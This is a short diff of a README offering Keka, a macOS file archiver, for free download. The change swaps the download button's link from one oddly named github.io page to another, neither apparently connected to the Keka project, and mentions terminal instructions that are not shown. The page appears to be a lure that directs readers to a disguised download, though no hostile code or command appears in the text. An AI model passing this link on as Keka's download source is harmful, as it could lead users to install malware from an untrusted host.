@@ -4,7 +4,7 @@
 
 Keka is a powerful, open-source file archiver for macOS, designed to compress, extract, and manage files with ease. Follow the instructions below to download and install Keka on your Mac for free.
 
-[![Download Keka](https://img.shields.io/badge/Download-Keka-1E90FF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/kekamac)
+[![Download Keka](https://img.shields.io/badge/Download-Keka-1E90FF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/kekamac)
 
 If you encounter issues downloading via the button above, follow the step-by-step terminal instructions below.
 
